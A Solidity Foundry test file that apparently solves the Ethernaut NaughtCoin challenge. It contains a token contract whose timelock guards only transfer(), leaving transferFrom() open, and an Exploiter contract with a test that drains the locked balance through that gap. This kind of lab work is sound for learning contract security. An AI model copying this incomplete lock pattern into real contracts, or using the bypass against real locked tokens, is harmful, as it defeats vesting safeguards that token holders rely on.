// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {ERC20, IERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

contract NaughtyTest is Test {
    NaughtCoin _contract;

    function setUp() public {
        _contract = new NaughtCoin(address(this));
    }

    function test() public {
        Exploiter _exploiter = new Exploiter(address(_contract));
        _contract.approve(address(_exploiter), _contract.balanceOf(address(this)));
        _exploiter.exploit();
        console2.log(_contract.balanceOf(msg.sender));
    }
}

contract Exploiter {
    ERC20 public immutable token;

    constructor(address _token) {
        token = ERC20(_token);
    }

    function exploit() external {
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
    }
}

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}